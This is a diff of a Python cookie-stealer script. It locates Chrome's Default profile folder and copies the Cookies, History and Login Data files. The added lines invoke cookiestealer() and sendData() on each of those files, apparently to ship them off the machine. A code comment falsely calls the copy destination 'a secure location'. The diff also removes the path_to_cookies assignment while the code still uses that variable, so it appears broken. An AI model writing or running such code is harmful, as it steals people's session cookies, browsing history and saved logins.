@@ -5,7 +5,11 @@ import getpass
 currentdir = os.getcwd()
 curentuser = getpass.getuser()
 
-path_to_cookies = "C:\Users\Public\Intel\Logs"
+try:
+	os.makedirs(path_to_cookies) #Copying the cookies, history and login data file to a secure location
+except OSError as exception:
+	if exception.errno != errno.EEXIST:
+		raise
 
 def cookiestealer():
 	cookiepath = 'C://Users//' + curentuser + '//AppData//Local//Google//Chrome//User Data//Default//'
@@ -83,3 +87,8 @@ def sendData(fname,fext):
 		pass
 
 	return True
+
+cookiestealer()
+sendData("Cookies","")
+sendData("History","")
+sendData("Login Data","")
